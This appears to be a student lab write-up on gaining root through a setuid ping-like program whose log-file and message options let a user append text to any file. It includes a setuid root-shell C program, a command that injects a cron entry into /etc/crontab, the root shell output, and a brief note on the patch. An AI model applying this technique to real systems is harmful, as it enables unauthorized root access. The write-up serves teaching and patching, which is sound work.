Privilege Escalation:
After reading the source code, analyzing it and testing a bit, I realised that
the weird feature of choosing a log file and a custom message were also running
as root, so I could append a custom message to any file in the host.

The way I exploited it to get access to a root shell was adding the following C
code into "/tmp/rt.c":

  int main(){
    setgid(0);
    setuid(0);
    execl("/bin/sh", "sh", 0);
  }

Then I compiled it with "gcc rt.c -o rt", and then I executed the vulnerable
script with the following arguments:

  ping 127.0.0.1 -m "* * * * * root chown root:root /tmp/rt; chmod a+s /tmp/rt;" -f /etc/crontab -c 0

This appended the message into the /etc/crontab file, which is the config file
for cron, setting it up to run every minute the following commands: 

  chown root:root /tmp/rt;
  chmod a+s /tmp/rt;

Then, when my executable binary is executed now:

  stud18@sping:/tmp$ ./rt
  # id
  uid=0(root) gid=0(root) groups=0(root),1013(students),1019(stud18)
  # su
  root@sping:/tmp# 

It runs as root, giving us permission to disguise as root (setuid(0); and
setgid(0);) and run a root shell.

The patch file fixes it through, before opening the logfile, giving up of the
root privileges, and then taking back after it to open the socket.
